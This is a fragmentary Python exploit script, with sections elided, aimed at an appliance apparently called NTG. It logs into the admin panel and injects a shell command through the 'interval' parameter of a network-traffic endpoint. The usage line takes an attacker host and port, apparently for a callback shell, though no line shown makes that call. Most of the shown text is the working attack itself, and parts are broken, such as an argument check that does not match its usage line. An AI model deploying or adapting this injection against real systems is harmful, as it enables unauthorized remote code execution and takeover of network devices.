...
def do_login(base_url, session_value):
    ...
    try:
        print("[+] Attempting to log into NTG...")
        ...
        sys.exit(0)
    if (f.status_code == 302 and f.headers['Location'] == '/SAFe/ntg_control_panel'):
        print("[*] Logged in?")
        return True
    else:
        return False
...
def do_remote_exec(base_url, session_value, command):
    target_url = base_url + '/admin/network-traffic.xml.php'
    injection = f"$({command})"
    exploit_data = {"interval": injection,
                    "interface": "eth0"}
    cookie = f"PHPSESSID={session_value}"
...
def main(args):
    if len(args) != 4:
        sys.exit("use: %s https://some-ntg.lol:81 hacke.rs 1337 username password" %(args[0]))
